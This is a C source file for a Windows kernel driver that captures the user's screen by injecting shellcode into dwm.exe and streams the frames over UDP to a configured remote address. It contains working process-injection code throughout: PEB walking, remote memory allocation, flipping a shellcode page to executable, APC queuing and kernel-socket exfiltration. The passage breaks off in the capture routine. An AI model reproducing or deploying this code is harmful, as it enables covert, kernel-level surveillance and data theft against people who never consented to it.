/*++

Module Name:

    ScreenShot.c

Abstract:

    Pure-kernel screen capture via GDI shellcode injection into dwm.exe.

    Pipeline:
      1. Find dwm.exe EPROCESS (console session)
      2. Attach, walk PEB->Ldr, parse PE exports to resolve GDI/User32 APIs
      3. Alloc RW buffer (SC_PARAMS + pixel area) in dwm.exe
      4. Alloc RW page, write shellcode, flip to RX
      5. Queue user APC on first dwm thread
      6. Shellcode fires: GetDC / BitBlt / GetDIBits, writes BGRA pixels
      7. Kernel polls Ready flag via MmCopyVirtualMemory
      8. Read pixel data, free remote allocations
      9. Stream frame over WSK UDP (NDARK1 B|shot / Y| / E|shot protocol)

--*/

#include "ScreenShot.h"
#include "Wsk.h"
#include "Ioctl.h"
#include "ShellcodeGdiBytes.h"
#include <ntstrsafe.h>

#define LOG(fmt, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \
                                 "[NetDrv] " fmt "\n", ##__VA_ARGS__)
#define TAG_SS 'sSnD'

/* ===================================================================
   Undocumented kernel API declarations (stable Win7 .. Win11)
   =================================================================== */

NTKERNELAPI PPEB    PsGetProcessPeb(_In_ PEPROCESS Process);
NTKERNELAPI HANDLE  PsGetProcessId (_In_ PEPROCESS Process);

NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(
    _In_ HANDLE ProcessId, _Outptr_ PEPROCESS* Process);

NTKERNELAPI NTSTATUS PsLookupThreadByThreadId(
    _In_ HANDLE ThreadId, _Outptr_ PETHREAD* Thread);

NTSTATUS NTAPI MmCopyVirtualMemory(
    _In_  PEPROCESS FromProcess,  _In_  PVOID    FromAddress,
    _In_  PEPROCESS ToProcess,    _Out_ PVOID    ToAddress,
    _In_  SIZE_T    BufferSize,   _In_  KPROCESSOR_MODE Mode,
    _Out_ PSIZE_T   NumberOfBytesCopied);

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG Class, _Inout_ PVOID Info,
    _In_ ULONG Length, _Out_opt_ PULONG ReturnLength);

NTSYSAPI NTSTATUS NTAPI ZwProtectVirtualMemory(
    _In_    HANDLE   ProcessHandle,
    _Inout_ PVOID*   BaseAddress,
    _Inout_ PSIZE_T  RegionSize,
    _In_    ULONG    NewProtect,
    _Out_   PULONG   OldProtect);

/* KAPC_STATE / KeStackAttachProcess live in ntifs.h which conflicts
   with the project's ntddk.h-only setup.  Declare them manually.   */

typedef struct _KAPC_STATE {
    LIST_ENTRY ApcListHead[2];
    PEPROCESS  Process;
    UCHAR      Flags[4];
} KAPC_STATE, *PKAPC_STATE;

NTKERNELAPI VOID KeStackAttachProcess(
    _Inout_ PEPROCESS   Process,
    _Out_   PKAPC_STATE ApcState);

NTKERNELAPI VOID KeUnstackDetachProcess(
    _In_ PKAPC_STATE ApcState);

/* Zw virtual-memory APIs (ntifs.h only) */

NTSYSAPI NTSTATUS NTAPI ZwAllocateVirtualMemory(
    _In_    HANDLE    ProcessHandle,
    _Inout_ PVOID*    BaseAddress,
    _In_    ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T   RegionSize,
    _In_    ULONG     AllocationType,
    _In_    ULONG     Protect);

NTSYSAPI NTSTATUS NTAPI ZwFreeVirtualMemory(
    _In_    HANDLE  ProcessHandle,
    _Inout_ PVOID*  BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_    ULONG   FreeType);

/* APC types and functions -- exported by ntoskrnl, absent from ntddk.h */

typedef VOID (NTAPI *PKNORMAL_ROUTINE)(
    _In_opt_ PVOID NormalContext,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2);

typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTKERNELAPI VOID KeInitializeApc(
    _Out_    PKAPC              Apc,
    _In_     PETHREAD           Thread,
    _In_     KAPC_ENVIRONMENT   Environment,
    _In_     PVOID              KernelRoutine,
    _In_opt_ PVOID              RundownRoutine,
    _In_opt_ PKNORMAL_ROUTINE   NormalRoutine,
    _In_     KPROCESSOR_MODE    ApcMode,
    _In_opt_ PVOID              NormalContext);

NTKERNELAPI BOOLEAN KeInsertQueueApc(
    _Inout_  PKAPC    Apc,
    _In_opt_ PVOID    SystemArgument1,
    _In_opt_ PVOID    SystemArgument2,
    _In_     KPRIORITY Increment);

/* ===================================================================
   PEB / LDR structures (x64 offsets, stable Win7 .. Win11)
   =================================================================== */

#pragma warning(push)
#pragma warning(disable: 4201) /* nameless struct/union */

typedef struct _SC_PEB_LDR {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;   /* +0x10 */
} SC_PEB_LDR;

typedef struct _SC_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;            /* +0x00 */
    LIST_ENTRY     InMemoryOrderLinks;          /* +0x10 */
    LIST_ENTRY     InInitOrderLinks;            /* +0x20 */
    PVOID          DllBase;                     /* +0x30 */
    PVOID          EntryPoint;                  /* +0x38 */
    ULONG          SizeOfImage;                 /* +0x40 */
    ULONG          _pad0;
    UNICODE_STRING FullDllName;                 /* +0x48 */
    UNICODE_STRING BaseDllName;                 /* +0x58 */
} SC_LDR_ENTRY;

typedef struct _SC_PEB {
    UCHAR       Reserved1[2];
    UCHAR       BeingDebugged;
    UCHAR       Reserved2[1];
    PVOID       Reserved3[2];
    SC_PEB_LDR* Ldr;                           /* +0x18 */
} SC_PEB;

#pragma warning(pop)

/* ===================================================================
   SC_PARAMS - shared layout between kernel and shellcode.
   MUST match the struct in ShellcodeGdi.c exactly.
   =================================================================== */

typedef struct _SC_PARAMS {
    ULONG64  pfnGetDC;                  /* +0x00  user32  */
    ULONG64  pfnReleaseDC;              /* +0x08          */
    ULONG64  pfnCreateCompatibleDC;     /* +0x10  gdi32   */
    ULONG64  pfnDeleteDC;              /* +0x18          */
    ULONG64  pfnCreateCompatibleBitmap; /* +0x20          */
    ULONG64  pfnSelectObject;           /* +0x28          */
    ULONG64  pfnBitBlt;                 /* +0x30          */
    ULONG64  pfnGetDIBits;              /* +0x38          */
    ULONG64  pfnDeleteObject;           /* +0x40          */
    ULONG64  pfnGetSystemMetrics;       /* +0x48  user32  */
    ULONG    Width;                     /* +0x50          */
    ULONG    Height;                    /* +0x54          */
    ULONG    Stride;                    /* +0x58          */
    ULONG    FrameSize;                 /* +0x5C          */
    volatile LONG  Ready;               /* +0x60          */
    volatile LONG  Status;              /* +0x64          */
    UCHAR    Pixels[1];                 /* +0x68  BGRA    */
} SC_PARAMS;

#define SC_PIXEL_OFFSET  FIELD_OFFSET(SC_PARAMS, Pixels)
#define SC_MAX_PIXELS    (3840u * 2160u)
#define SC_MAX_FRAME     (SC_MAX_PIXELS * 4u)
#define SC_ALLOC_SIZE    (SC_PIXEL_OFFSET + SC_MAX_FRAME)  /* ~32 MB */

/* ===================================================================
   (1)  Find dwm.exe
   =================================================================== */

typedef struct _SPI_ENTRY {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  Reserved[3];
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY      BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
} SPI_ENTRY;

/* Thread entry that follows SPI_ENTRY in SystemProcessInformation.
   The thread array starts at offset 0x100 from the process entry on x64. */
#define SPI_THREAD_ARRAY_OFFSET  0x100
#define DWM_MAX_THREADS  32

typedef struct _SPI_THREAD {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG         WaitTime;
    ULONG         _pad0;
    PVOID         StartAddress;
    HANDLE        ProcessId;
    HANDLE        ThreadId;
    KPRIORITY     Priority;
    LONG          BasePriority;
    ULONG         ContextSwitches;
    ULONG         State;
    ULONG         WaitReason;
    ULONG         _pad1;
} SPI_THREAD;

static BOOLEAN
IsDwmName(_In_ PCWSTR buf, _In_ USHORT chars)
{
    if (chars != 7) return FALSE;
    return (buf[0] == L'd' || buf[0] == L'D') &&
           (buf[1] == L'w' || buf[1] == L'W') &&
           (buf[2] == L'm' || buf[2] == L'M') &&
            buf[3] == L'.'  &&
           (buf[4] == L'e' || buf[4] == L'E') &&
           (buf[5] == L'x' || buf[5] == L'X') &&
           (buf[6] == L'e' || buf[6] == L'E');
}

static NTSTATUS
FindDwmProcess(_Outptr_ PEPROCESS* OutProcess,
               _Out_writes_(DWM_MAX_THREADS) HANDLE* OutTids,
               _Out_ ULONG* OutTidCount)
{
    NTSTATUS status;
    ULONG    size = 0;
    PVOID    buf  = NULL;

    *OutProcess  = NULL;
    *OutTidCount = 0;

    status = ZwQuerySystemInformation(5 /*SystemProcessInformation*/,
                                      NULL, 0, &size);
    if (size == 0) return STATUS_UNSUCCESSFUL;

    size += 0x10000;
    buf = ExAllocatePool2(POOL_FLAG_PAGED, size, TAG_SS);
    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;

    status = ZwQuerySystemInformation(5, buf, size, &size);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(buf, TAG_SS);
        return status;
    }

    SPI_ENTRY* p = (SPI_ENTRY*)buf;
    for (;;) {
        if (p->ImageName.Buffer && p->ImageName.Length > 0) {
            if (IsDwmName(p->ImageName.Buffer,
                          p->ImageName.Length / sizeof(WCHAR))) {
                PEPROCESS proc = NULL;
                if (NT_SUCCESS(PsLookupProcessByProcessId(
                        p->UniqueProcessId, &proc))) {
                    if (PsGetProcessPeb(proc)) {
                        *OutProcess = proc;
                        /* Collect ALL thread IDs */
                        if (p->NumberOfThreads > 0) {
                            SPI_THREAD* ta = (SPI_THREAD*)(
                                (PUCHAR)p + SPI_THREAD_ARRAY_OFFSET);
                            ULONG n = min(p->NumberOfThreads, DWM_MAX_THREADS);
                            ULONG j;
                            for (j = 0; j < n; j++)
                                OutTids[j] = ta[j].ThreadId;
                            *OutTidCount = n;
                        }
                        break;
                    }
                    ObDereferenceObject(proc);
                }
            }
        }
        if (p->NextEntryOffset == 0) break;
        p = (SPI_ENTRY*)((PUCHAR)p + p->NextEntryOffset);
    }

    ExFreePoolWithTag(buf, TAG_SS);
    return *OutProcess ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

/* ===================================================================
   (2)  PEB / Ldr walking  +  PE export resolution
   =================================================================== */

/*
 * Find a module by BaseDllName (case-insensitive).
 * MUST be called WHILE ATTACHED to the target process.
 */
static PVOID
FindModuleBase(_In_ PEPROCESS Process, _In_ PCWSTR DllName)
{
    SC_PEB* peb = (SC_PEB*)PsGetProcessPeb(Process);
    if (!peb) return NULL;

    PVOID  result     = NULL;
    SIZE_T dllNameLen = wcslen(DllName);

    __try {
        SC_PEB_LDR* ldr = peb->Ldr;
        if (!ldr || !ldr->Initialized) return NULL;

        LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
        LIST_ENTRY* e;
        for (e = head->Flink; e && e != head; e = e->Flink) {
            SC_LDR_ENTRY* mod =
                CONTAINING_RECORD(e, SC_LDR_ENTRY, InLoadOrderLinks);
            if (!mod->BaseDllName.Buffer || mod->BaseDllName.Length == 0)
                continue;
            USHORT chars = mod->BaseDllName.Length / sizeof(WCHAR);
            if ((SIZE_T)chars != dllNameLen) continue;

            BOOLEAN match = TRUE;
            USHORT  i;
            for (i = 0; i < chars; i++) {
                WCHAR a = mod->BaseDllName.Buffer[i];
                WCHAR b = DllName[i];
                if (a >= L'a' && a <= L'z') a -= 32;
                if (b >= L'a' && b <= L'z') b -= 32;
                if (a != b) { match = FALSE; break; }
            }
            if (match) { result = mod->DllBase; break; }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = NULL;
    }
    return result;
}

/*
 * Compare two null-terminated ANSI strings (both may be in user memory).
 */
static BOOLEAN
StrEqA(_In_ const CHAR* a, _In_ const CHAR* b)
{
    while (*a && *b) {
        if (*a != *b) return FALSE;
        a++; b++;
    }
    return *a == *b;
}

/*
 * Parse PE export table of a user-mode DLL and find a function by name.
 * Handles forwarders (e.g., gdi32.dll -> api-ms-* -> gdi32full.dll).
 * MUST be called WHILE ATTACHED.
 */
static ULONG64
FindExport(_In_  PEPROCESS Process,
           _In_  PVOID     ModuleBase,
           _In_  PCSTR     FuncName,
           _In_  int       Depth)
{
    PUCHAR  base;
    ULONG64 result = 0;

    if (!ModuleBase || !FuncName || Depth > 3) return 0;
    base = (PUCHAR)ModuleBase;

    __try {
        LONG   peOfs;
        PUCHAR pe;
        ULONG  expRva, expSize;
        PUCHAR expDir;
        ULONG  nNames, aFuncs, aNames, aOrds;
        ULONG* nameRvas;
        USHORT* ordinals;
        ULONG* funcRvas;
        ULONG  i;

        /* DOS header */
        if (*(USHORT*)base != 0x5A4D) return 0;
        peOfs = *(LONG*)(base + 0x3C);
        if (peOfs <= 0 || peOfs > 0x1000) return 0;

        /* PE signature + PE32+ magic */
        pe = base + peOfs;
        if (*(ULONG*)pe       != 0x00004550) return 0;
        if (*(USHORT*)(pe + 0x18) != 0x20B)  return 0;

        /* Export directory */
        expRva  = *(ULONG*)(pe + 0x18 + 0x70);
        expSize = *(ULONG*)(pe + 0x18 + 0x74);
        if (!expRva || !expSize) return 0;

        expDir   = base + expRva;
        nNames   = *(ULONG*)(expDir + 0x18);
        aFuncs   = *(ULONG*)(expDir + 0x1C);
        aNames   = *(ULONG*)(expDir + 0x20);
        aOrds    = *(ULONG*)(expDir + 0x24);

        nameRvas = (ULONG*)(base + aNames);
        ordinals = (USHORT*)(base + aOrds);
        funcRvas = (ULONG*)(base + aFuncs);

        for (i = 0; i < nNames; i++) {
            CHAR* name = (CHAR*)(base + nameRvas[i]);
            if (!StrEqA(name, FuncName)) continue;

            {
                ULONG funcRva = funcRvas[ordinals[i]];

                /* Forwarder? RVA inside export directory range. */
                if (funcRva >= expRva && funcRva < expRva + expSize) {
                    CHAR* fwd = (CHAR*)(base + funcRva);
                    CHAR  fwdMod[128];
                    CHAR  fwdFn[128];
                    int   dot = -1, k;

                    for (k = 0; k < 126; k++) fwdMod[k] = 0;
                    for (k = 0; k < 126; k++) fwdFn[k]  = 0;

                    for (k = 0; k < 126 && fwd[k]; k++) {
                        if (fwd[k] == '.') { dot = k; break; }
                        fwdMod[k] = fwd[k];
                    }
                    if (dot > 0) {
                        for (k = 0; k < 126 && fwd[dot + 1 + k]; k++)
                            fwdFn[k] = fwd[dot + 1 + k];

                        /* Convert module name to wide + append .DLL */
                        {
                            WCHAR wMod[140];
                            SIZE_T wLen;
                            PVOID  fwdBase;

                            for (k = 0; k < 139; k++) wMod[k] = 0;
                            for (k = 0; fwdMod[k] && k < 128; k++)
                                wMod[k] = (WCHAR)fwdMod[k];
                            wLen = wcslen(wMod);
                            if (wLen > 0 && (wLen < 4 || wMod[wLen - 4] != L'.')) {
                                wMod[wLen]     = L'.';
                                wMod[wLen + 1] = L'D';
                                wMod[wLen + 2] = L'L';
                                wMod[wLen + 3] = L'L';
                                wMod[wLen + 4] = 0;
                            }

                            fwdBase = FindModuleBase(Process, wMod);

                            /*
                             * API-set fallback: "api-ms-win-gdi-*" maps to
                             * gdi32full.dll; "api-ms-win-core-*" maps to
                             * kernelbase.dll.  These virtual DLLs are NOT in
                             * PEB -> Ldr by their api-ms-* name.
                             */
                            if (!fwdBase &&
                                wLen >= 4 &&
                                (wMod[0] == L'A' || wMod[0] == L'a') &&
                                (wMod[1] == L'P' || wMod[1] == L'p') &&
                                (wMod[2] == L'I' || wMod[2] == L'i') &&
                                 wMod[3] == L'-') {
                                fwdBase = FindModuleBase(Process, L"GDI32FULL.DLL");
                                if (!fwdBase)
                                    fwdBase = FindModuleBase(Process, L"KERNELBASE.DLL");
                                if (!fwdBase)
                                    fwdBase = FindModuleBase(Process, L"KERNEL32.DLL");
                            }

                            if (fwdBase)
                                result = FindExport(Process, fwdBase,
                                                    fwdFn, Depth + 1);
                        }
                    }
                } else {
                    result = (ULONG64)base + funcRva;
                }
            }
            break;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = 0;
    }
    return result;
}

/* ===================================================================
   (3)  Resolve all required GDI / User32 APIs
   =================================================================== */

typedef struct _API_REQ {
    PCWSTR Module;
    PCWSTR Fallback;      /* NULL or alternate module name */
    PCSTR  FuncName;
    ULONG  Offset;        /* byte offset in SC_PARAMS */
} API_REQ;

static const API_REQ g_Apis[] = {
    { L"USER32.DLL",   NULL,          "GetDC",
      FIELD_OFFSET(SC_PARAMS, pfnGetDC) },
    { L"USER32.DLL",   NULL,          "ReleaseDC",
      FIELD_OFFSET(SC_PARAMS, pfnReleaseDC) },
    { L"USER32.DLL",   NULL,          "GetSystemMetrics",
      FIELD_OFFSET(SC_PARAMS, pfnGetSystemMetrics) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "CreateCompatibleDC",
      FIELD_OFFSET(SC_PARAMS, pfnCreateCompatibleDC) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "DeleteDC",
      FIELD_OFFSET(SC_PARAMS, pfnDeleteDC) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "CreateCompatibleBitmap",
      FIELD_OFFSET(SC_PARAMS, pfnCreateCompatibleBitmap) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "SelectObject",
      FIELD_OFFSET(SC_PARAMS, pfnSelectObject) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "BitBlt",
      FIELD_OFFSET(SC_PARAMS, pfnBitBlt) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "GetDIBits",
      FIELD_OFFSET(SC_PARAMS, pfnGetDIBits) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "DeleteObject",
      FIELD_OFFSET(SC_PARAMS, pfnDeleteObject) },
};

static NTSTATUS
ResolveApis(_In_ PEPROCESS Process, _Out_ SC_PARAMS* P)
{
    KAPC_STATE apcState;
    NTSTATUS   status = STATUS_SUCCESS;
    ULONG      i;

    KeStackAttachProcess(Process, &apcState);

    for (i = 0; i < RTL_NUMBER_OF(g_Apis); i++) {
        PVOID modBase = FindModuleBase(Process, g_Apis[i].Module);
        if (!modBase && g_Apis[i].Fallback)
            modBase = FindModuleBase(Process, g_Apis[i].Fallback);

        if (!modBase) {
            LOG("ResolveApis: %ws not found", g_Apis[i].Module);
            status = STATUS_DLL_NOT_FOUND;
            break;
        }

        {
            ULONG64 addr = FindExport(Process, modBase,
                                      g_Apis[i].FuncName, 0);
            /* If not in primary module, try fallback module too */
            if (!addr && g_Apis[i].Fallback) {
                PVOID fbBase = FindModuleBase(Process, g_Apis[i].Fallback);
                if (fbBase && fbBase != modBase)
                    addr = FindExport(Process, fbBase,
                                      g_Apis[i].FuncName, 0);
            }
            if (!addr) {
                LOG("ResolveApis: %ws!%s not found",
                    g_Apis[i].Module, g_Apis[i].FuncName);
                status = STATUS_ENTRYPOINT_NOT_FOUND;
                break;
            }
            *(ULONG64*)((PUCHAR)P + g_Apis[i].Offset) = addr;
        }
    }

    KeUnstackDetachProcess(&apcState);   /* ALWAYS detach */
    return status;
}

/* ===================================================================
   (4)  Remote memory helpers
   =================================================================== */

static NTSTATUS
AllocRemote(_In_ PEPROCESS Proc, _In_ SIZE_T Size,
            _In_ ULONG Prot, _Out_ PVOID* Base)
{
    KAPC_STATE as;
    NTSTATUS   st;
    PVOID      base       = NULL;
    SIZE_T     regionSize = Size;

    KeStackAttachProcess(Proc, &as);
    st = ZwAllocateVirtualMemory(ZwCurrentProcess(), &base, 0,
                                  &regionSize, MEM_COMMIT | MEM_RESERVE, Prot);
    KeUnstackDetachProcess(&as);

    if (NT_SUCCESS(st)) *Base = base;
    return st;
}

static VOID
FreeRemote(_In_ PEPROCESS Proc, _In_ PVOID Base)
{
    KAPC_STATE as;
    SIZE_T     size = 0;
    KeStackAttachProcess(Proc, &as);
    ZwFreeVirtualMemory(ZwCurrentProcess(), &Base, &size, MEM_RELEASE);
    KeUnstackDetachProcess(&as);
}

static NTSTATUS
WriteRemote(_In_ PEPROCESS Proc, _In_ PVOID Dst,
            _In_ const VOID* Src, _In_ SIZE_T Len)
{
    SIZE_T n = 0;
    return MmCopyVirtualMemory(PsGetCurrentProcess(), (PVOID)Src,
                               Proc, Dst, Len, KernelMode, &n);
}

static NTSTATUS
ReadRemote(_In_ PEPROCESS Proc, _In_ PVOID Src,
           _Out_ PVOID Dst, _In_ SIZE_T Len)
{
    SIZE_T n = 0;
    return MmCopyVirtualMemory(Proc, Src,
                               PsGetCurrentProcess(), Dst,
                               Len, KernelMode, &n);
}

/* ===================================================================
   (5)  APC injection
   =================================================================== */

static VOID NTAPI
ApcKernelRoutine(_In_    PKAPC           Apc,
                 _Inout_ PKNORMAL_ROUTINE* NR,
                 _Inout_ PVOID*          NC,
                 _Inout_ PVOID*          SA1,
                 _Inout_ PVOID*          SA2)
{
    UNREFERENCED_PARAMETER(NR);
    UNREFERENCED_PARAMETER(NC);
    UNREFERENCED_PARAMETER(SA1);
    UNREFERENCED_PARAMETER(SA2);
    ExFreePoolWithTag(Apc, TAG_SS);
}

static NTSTATUS
QueueUserApc(_In_ HANDLE   ThreadId,
             _In_ PVOID    Routine,   /* user-mode shellcode addr */
             _In_ PVOID    Context)   /* user-mode params addr    */
{
    PETHREAD thread = NULL;
    PKAPC    apc;
    BOOLEAN  ok;
    NTSTATUS st;

    st = PsLookupThreadByThreadId(ThreadId, &thread);
    if (!NT_SUCCESS(st) || !thread) return STATUS_NOT_FOUND;

    apc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), TAG_SS);
    if (!apc) {
        ObDereferenceObject(thread);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    KeInitializeApc(apc, thread, OriginalApcEnvironment,
                    (PVOID)ApcKernelRoutine, NULL /* Rundown */,
                    (PKNORMAL_ROUTINE)Routine, UserMode, Context);

    ok = KeInsertQueueApc(apc, NULL, NULL, 0);
    ObDereferenceObject(thread);

    if (!ok) {
        ExFreePoolWithTag(apc, TAG_SS);
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

/* ===================================================================
   (6)  Frame sender (WSK UDP, NDARK1 protocol)
   =================================================================== */

static NTSTATUS
SendFrame(_In_ ULONG W, _In_ ULONG H,
          _In_ const UCHAR* Px, _In_ ULONG PxLen)
{
    static volatile LONG s_FrameId = 0;
    ULONG       fid;
    PWSK_SOCKET sock = NULL;
    NTSTATUS    st;
    SOCKADDR_IN local, peer;
    ULONG       chunkSz, chunkCnt, i;
    SIZE_T      sent;
    CHAR        hdr[256];
    CHAR*       pkt = NULL;
    static const CHAR kHex[] = "0123456789ABCDEF";

    fid = (ULONG)InterlockedIncrement(&s_FrameId);

    st = WSK_socket(&sock, AF_INET, SOCK_DGRAM, IPPROTO_UDP,
                     WSK_FLAG_DATAGRAM_SOCKET);
    if (!NT_SUCCESS(st)) return st;

    RtlZeroMemory(&local, sizeof(local));
    local.sin_family                   = AF_INET;
    local.sin_addr.S_un.S_un_b.s_b1   = NETDRV_DRIVER_IP_B1;
    local.sin_addr.S_un.S_un_b.s_b2   = NETDRV_DRIVER_IP_B2;
    local.sin_addr.S_un.S_un_b.s_b3   = NETDRV_DRIVER_IP_B3;
    local.sin_addr.S_un.S_un_b.s_b4   = NETDRV_DRIVER_IP_B4;
    st = WSKBind(sock, (PSOCKADDR)&local);
    if (!NT_SUCCESS(st)) { WSK_closesocket(sock); return st; }

    RtlZeroMemory(&peer, sizeof(peer));
    peer.sin_family                  = AF_INET;
    peer.sin_port                    = RtlUshortByteSwap(NETDRV_UDP_PORT);
    peer.sin_addr.S_un.S_un_b.s_b1  = NETDRV_APP_IP_B1;
    peer.sin_addr.S_un.S_un_b.s_b2  = NETDRV_APP_IP_B2;
    peer.sin_addr.S_un.S_un_b.s_b3  = NETDRV_APP_IP_B3;
    peer.sin_addr.S_un.S_un_b.s_b4  = NETDRV_APP_IP_B4;

    chunkSz  = 8192;
    chunkCnt = (PxLen + chunkSz - 1) / chunkSz;

    /* B|shot| header */
    RtlStringCbPrintfA(hdr, sizeof(hdr),
        NETDRV_UDP_PACKET_MAGIC "B|shot|%u|%u|%u|%X|%u|%u\n",
        fid, W, H, PxLen, chunkSz, chunkCnt);
    WSKSendTo(sock, hdr, strlen(hdr), &sent, (PSOCKADDR)&peer);

    /* Y| chunks (hex-encoded) */
    pkt = (CHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                                  chunkSz * 2 + 128, TAG_SS);
    if (pkt) {
        for (i = 0; i < chunkCnt; i++) {
            ULONG off = i * chunkSz;
            ULONG len = (PxLen - off > chunkSz) ? chunkSz : (PxLen - off);
            CHAR  ph[96];
            CHAR* dst;
            ULONG k;

            RtlStringCbPrintfA(ph, sizeof(ph),
                NETDRV_UDP_PACKET_MAGIC "Y|%u|%u|%X|%X|",
                fid, i, off, len);
            {
                SIZE_T phLen = strlen(ph);
                RtlCopyMemory(pkt, ph, phLen);
                dst = pkt + phLen;
            }

            for (k = 0; k < len; k++) {
                UCHAR b = Px[off + k];
                *dst++ = kHex[(b >> 4) & 0xF];
                *dst++ = kHex[b & 0xF];
            }
            *dst++ = '\n';

            WSKSendTo(sock, pkt, (SIZE_T)(dst - pkt),
                      &sent, (PSOCKADDR)&peer);
        }
        ExFreePoolWithTag(pkt, TAG_SS);
    }

    /* E|shot| trailer */
    {
        CHAR tr[96];
        RtlStringCbPrintfA(tr, sizeof(tr),
            NETDRV_UDP_PACKET_MAGIC "E|shot|%u|%u\n", fid, PxLen);
        WSKSendTo(sock, tr, strlen(tr), &sent, (PSOCKADDR)&peer);
    }

    WSK_closesocket(sock);
    if ((fid & 63) == 1)
        LOG("SendFrame: #%u %ux%u %u bytes %u chunks", fid, W, H, PxLen, chunkCnt);
    return STATUS_SUCCESS;
}

/* ===================================================================
   (7)  Persistent state + orchestrator
   =================================================================== */

static PEPROCESS g_Dwm           = NULL;
static SC_PARAMS g_LocalP;                    /* resolved API addresses  */
static PVOID     g_RemoteParams  = NULL;      /* dwm-side params+pixels  */
static PVOID     g_RemoteCode    = NULL;      /* dwm-side shellcode page */
static HANDLE    g_CachedTid     = NULL;
static HANDLE    g_AllTids[DWM_MAX_THREADS];
static ULONG     g_AllTidCount   = 0;
static PVOID     g_PixelBuf      = NULL;      /* kernel-side frame buffer */
static ULONG     g_PixelBufSize  = 0;
static ULONG     g_FrameCount    = 0;
static BOOLEAN   g_Inited        = FALSE;

static NTSTATUS
ScreenEnsureInit(VOID)
{
    NTSTATUS st;

    if (g_Inited) return STATUS_SUCCESS;

    LOG("ScreenInit: one-time setup");

    RtlZeroMemory(g_AllTids, sizeof(g_AllTids));
    st = FindDwmProcess(&g_Dwm, g_AllTids, &g_AllTidCount);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: dwm not found 0x%08X", st); return st; }
    LOG("ScreenInit: dwm pid=%u threads=%u",
        (ULONG)(ULONG_PTR)PsGetProcessId(g_Dwm), g_AllTidCount);

    RtlZeroMemory(&g_LocalP, sizeof(g_LocalP));
    st = ResolveApis(g_Dwm, &g_LocalP);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: API resolve 0x%08X", st); goto Fail; }

    st = AllocRemote(g_Dwm, SC_ALLOC_SIZE, PAGE_READWRITE, &g_RemoteParams);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: alloc params 0x%08X", st); goto Fail; }

    st = AllocRemote(g_Dwm, PAGE_SIZE, PAGE_READWRITE, &g_RemoteCode);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: alloc code 0x%08X", st); goto Fail; }

    st = WriteRemote(g_Dwm, g_RemoteCode, g_ShellcodeGdi, g_ShellcodeGdiSize);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: write code 0x%08X", st); goto Fail; }

    {
        KAPC_STATE as;
        PVOID  base = g_RemoteCode;
        SIZE_T sz   = PAGE_SIZE;
        ULONG  oldP;
        KeStackAttachProcess(g_Dwm, &as);
        st = ZwProtectVirtualMemory(ZwCurrentProcess(), &base, &sz,
                                     PAGE_EXECUTE_READ, &oldP);
        KeUnstackDetachProcess(&as);
        if (!NT_SUCCESS(st)) { LOG("ScreenInit: protect RX 0x%08X", st); goto Fail; }
    }

    /* Write initial params (API pointers) */
    g_LocalP.Ready  = 0;
    g_LocalP.Status = -1;
    st = WriteRemote(g_Dwm, g_RemoteParams, &g_LocalP, sizeof(g_LocalP));
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: write params 0x%08X", st); goto Fail; }

    g_Inited = TRUE;
    LOG("ScreenInit: done, remote params=%p code=%p", g_RemoteParams, g_RemoteCode);
    return STATUS_SUCCESS;

Fail:
    NetDrvScreenCleanup();
    return st;
}

VOID
NetDrvScreenCleanup(VOID)
{
    if (g_PixelBuf)     { ExFreePoolWithTag(g_PixelBuf, TAG_SS); g_PixelBuf = NULL; }
    if (g_RemoteCode)   { if (g_Dwm) FreeRemote(g_Dwm, g_RemoteCode);   g_RemoteCode = NULL; }
    if (g_RemoteParams) { if (g_Dwm) FreeRemote(g_Dwm, g_RemoteParams); g_RemoteParams = NULL; }
    if (g_Dwm)          { ObDereferenceObject(g_Dwm); g_Dwm = NULL; }
    g_Inited = FALSE;
    g_CachedTid = NULL;
    g_AllTidCount = 0;
    g_PixelBufSize = 0;
}

NTSTATUS
NetDrvScreenCapture(VOID)
{
    NTSTATUS st;
    LONG     ready = 0;

    PAGED_CODE();

    /* ---- lazy init ---- */
    st = ScreenEnsureInit();
    if (!NT_SUCCESS(st)) return st;

